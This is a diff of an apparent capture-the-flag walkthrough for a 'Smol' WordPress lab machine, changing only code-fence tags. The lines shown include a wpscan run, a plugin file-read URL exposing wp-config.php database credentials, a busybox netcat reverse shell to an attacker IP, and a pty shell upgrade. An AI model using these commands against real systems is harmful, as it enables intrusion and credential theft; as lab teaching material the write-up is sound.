@@ -17,7 +17,7 @@ Get a cup of coffee ☕ first this will be a little bit long walkthrough 😊
 From the end of the page on **http://www.smol.thm** or from **wappalyzer** this website is using **WordPress**
 ![image](/assets/img/posts/smol/Screenshot_3.png)
 so start to scan it with wpscan
-```bash
+```
 wpscan --url [http://www.smol.thm](http://www.smol.thm/)
 ```
 from the scan result there is a plugin called **jsmol2wp** where did i here this name before🤔 
@@ -31,7 +31,7 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=g
 in the **wp-config.php** file we found a credentials for a user called **wpuser**
 ![image.png](/assets/img/posts/smol/image%2018.png)
 
-```bash
+```
 /** Database username */
 define( 'DB_USER', 'wpuser' );
 
@@ -74,7 +74,7 @@ busybox nc 10.11.130.37 4444 -e sh
 ```
 and we got our initial access 🎉
 ## Privilege Escalation
-```bash
+```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 As we know that there is a database running let's try to get another user creds from it  
